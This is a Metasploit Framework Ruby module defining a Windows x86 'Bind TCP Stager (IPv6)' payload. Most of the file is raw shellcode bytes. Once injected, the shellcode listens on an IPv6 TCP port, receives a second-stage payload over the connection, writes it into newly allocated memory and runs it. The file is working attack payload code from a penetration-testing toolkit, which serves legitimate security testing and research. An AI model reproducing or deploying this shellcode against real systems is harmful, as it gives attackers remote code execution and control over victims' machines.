##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


module Metasploit3

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def self.handler_type_alias
    "bind_ipv6_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager (IPv6)',
      'Description'   => 'Listen for a connection over IPv6',
      'Author'        => ['hdm', 'skape'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockedi',
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT'   => [ 304+1, 'n' ],
            },
          'Payload' =>
            "\xFC"+
            "\xE8\x56\x00\x00\x00\x53\x55\x56\x57\x8B\x6C\x24\x18\x8B\x45\x3C" +
            "\x8B\x54\x05\x78\x01\xEA\x8B\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x32" +
            "\x49\x8B\x34\x8B\x01\xEE\x31\xFF\xFC\x31\xC0\xAC\x38\xE0\x74\x07" +
            "\xC1\xCF\x0D\x01\xC7\xEB\xF2\x3B\x7C\x24\x14\x75\xE1\x8B\x5A\x24" +
            "\x01\xEB\x66\x8B\x0C\x4B\x8B\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8" +
            "\xEB\x02\x31\xC0\x5F\x5E\x5D\x5B\xC2\x08\x00\x31\xD2\x64\x8B\x52" +
            "\x30\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x6A\x18\x59\x31\xFF\x31" +
            "\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x81" +
            "\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDB\x5E\x53\x68\x8E" +
            "\x4E\x0E\xEC\xFF\xD6\x89\xC7\x53\x68\x54\xCA\xAF\x91\xFF\xD6\x81" +
            "\xEC\x00\x01\x00\x00\x50\x57\x56\x53\x89\xE5\xE8\x27\x00\x00\x00" +
            "\x90\x01\x00\x00\xB6\x19\x18\xE7\xEC\xF2\x55\xC0\xE5\x49\x86\x49" +
            "\xA4\x1A\x70\xC7\xA4\xAD\x2E\xE9\xD9\x09\xF5\xAD\xCB\xED\xFC\x3B" +
            "\x57\x53\x32\x5F\x33\x32\x00\x5B\x8D\x4B\x20\x51\xFF\xD7\x89\xDF" +
            "\x89\xC3\x8D\x75\x14\x6A\x07\x59\x51\x53\xFF\x34\x8F\xFF\x55\x04" +
            "\x59\x89\x04\x8E\xE2\xF2\x2B\x27\x54\x68\x02\x02\x00\x00\xFF\x55" +
            "\x30\x31\xC0\x50\x50\x50\x6A\x06\x6A\x01\x6A\x17\xFF\x55\x2C\x89" +
            "\xC7\x6A\x0A\x89\xE0\x6A\x04\x50\x6A\x17\x6A\x29\x57\xFF\x55\x1C" +
            "\x58\x68\x00\x00\x00\x00\x31\xC9\x51\x51\x51\x51\x51\x68\x17\x00" +
            "\xFF\xFF\x89\xE1\x6A\x1C\x51\x57\xFF\x55\x24\x31\xDB\x53\x57\xFF" +
            "\x55\x28\x53\x53\x57\xFF\x55\x20\x89\xC7\x6A\x40\x5E\x56\xC1\xE6" +
            "\x06\x56\xC1\xE6\x08\x56\x6A\x00\xFF\x55\x0C\x89\xC3\x6A\x00\x68" +
            "\x00\x10\x00\x00\x53\x57\xFF\x55\x18\xFF\xD3"
        }
      ))
  end

end
